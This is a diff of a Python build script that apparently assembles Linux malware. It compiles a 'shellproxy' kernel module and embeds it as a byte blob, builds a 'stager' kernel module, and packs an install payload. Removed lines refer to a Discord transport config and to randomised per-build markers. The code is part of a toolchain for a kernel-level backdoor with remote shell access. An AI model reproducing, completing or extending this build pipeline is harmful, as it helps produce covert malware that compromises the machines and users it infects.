@@ -24,30 +24,8 @@ def read(p):
     with open(p, "rb") as f:
         return f.read()
 
-
-def write(p, d):
-    with open(p, "wb") as f:
-        f.write(d)
-
-"""
-this is the core building code. as you can tell its very badly written, and is mainly meant to just set up all the hot patching shit in the ehader files/config/etc.
-you can edit this to add extra steps. think of this is a makefile/magefile but more retarded
-"""
-# per-build markers
-magic = secrets.token_hex(8)
-write("rand.h", f"""#define CN_END "__{magic}__"
-#define RMAGIC "{magic}"
-""".encode())
-print(f"+ markers {magic}")
-
-# config
-run("cc", "-O2", "-o", "configgen", "configgen.c")
-with open("config.h", "wb") as f:
-    subprocess.run(["./configgen", "config.json"], stdout=f, check=True)
-
-# 5. shellproxy module: embed the raw .ko.
 if not os.path.exists("shellproxy/dd_conf.h"):
-    sys.exit("dd_conf.h missing; full build needs the discord transport config")
+    sys.exit("conf.h missing")
 for f in glob.glob("lib/*.o"):
     os.remove(f)
 mkargs = ["make", "-C", "shellproxy"]
@@ -59,14 +37,14 @@ proxy_data = ",".join("0x%02x" % b for b in proxy)
 write("proxy_blob.h", f"""static const unsigned char proxy_blob[] = {{{proxy_data}}};
 static const unsigned int proxy_len = {len(proxy)};
 """.encode())
-print(f"+ shellproxy {len(proxy)} bytes embedded")
+print(f"+ sproxy got {len(proxy)}")
 
-# 6. stager
+# stager
 run("make", "-C", "stager", "clean")
 run("make", "-C", "stager")
 write("stager.ko", read("stager/stager.ko"))
 
-# 6. install and stubs
+# ./install
 install_src = os.environ.get("INSTALL_SRC", "install")
 if os.path.exists(install_src) and os.path.getsize(install_src) > 0:
     install = read(install_src)
